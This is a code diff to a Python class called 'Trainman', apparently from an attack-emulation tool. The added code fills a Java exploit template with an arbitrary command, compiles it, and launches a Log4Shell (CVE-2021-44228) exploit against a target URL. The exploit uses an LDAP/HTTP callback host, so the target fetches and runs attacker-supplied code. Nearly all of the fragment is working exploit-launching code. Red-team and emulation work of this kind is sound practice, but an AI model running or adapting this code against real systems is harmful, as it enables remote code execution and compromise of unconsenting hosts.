@@ -366,6 +366,27 @@ class Trainman:
         os.environ['JAVA_HOME'] = '/root/.jabba/jdk/adopt@1.8.0-292'
         os.environ['PATH'] = os.environ['PATH'] + ':/root/.jabba/jdk/adopt@1.8.0-292/bin'
         env.update(os.environ)
+        with open('/L4sh/db/template.java', 'r') as exploit_template:
+            exploit_code = exploit_template.read().replace('CMDGOESHERE', exec_cmd)
+        with open('/tmp/Main.java', 'w') as exploit_java:
+            exploit_java.write(exploit_code)
+        build_exploit_cmd = 'javac /tmp/Main.java'
+        build_exploit = subprocess.Popen(build_exploit_cmd,
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            shell=True,
+            env=env)
+        build_exploit_output, build_exploit_error = build_exploit.communicate()
+        if build_exploit_error:
+            output = {
+                'outcome': 'failed',
+                'message': 'Build for exploit_cve_2021_44228 failed. '
+                           f'stdout: {build_exploit_output.decode()}, '
+                           f'stderr: {build_exploit_error.decode()}',
+                'forward_log': 'False'
+            }
+            return output
         exploit_cve_2021_44228_cmd = \
             f'python3 main.py -i {self.host_info[2]} -e {callback} -u {target_url} -c {exec_cmd} -p {http_port} ' \
             f'-l {ldap_port}'
